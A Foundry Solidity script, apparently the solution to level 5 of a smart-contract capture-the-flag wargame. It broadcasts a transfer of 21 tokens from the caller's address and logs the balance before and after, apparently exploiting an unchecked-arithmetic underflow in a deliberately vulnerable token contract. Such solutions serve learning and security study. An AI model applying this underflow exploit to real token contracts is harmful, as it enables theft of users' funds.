// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IToken {
    function balanceOf(address _owner) external view returns (uint256 balance);
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract Lv5Solution is Script {
    uint256 constant VALUE_TRANSFER = 21;

    function run(address myAddress, address differentAddress, address targetContract) public {
        IToken tok = IToken(targetContract);

        console.log("My initial balance: ", tok.balanceOf(myAddress));

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tok.transfer(differentAddress, VALUE_TRANSFER);
        vm.stopBroadcast();

        console.log("My balance after transfer: ", tok.balanceOf(myAddress));
    }
}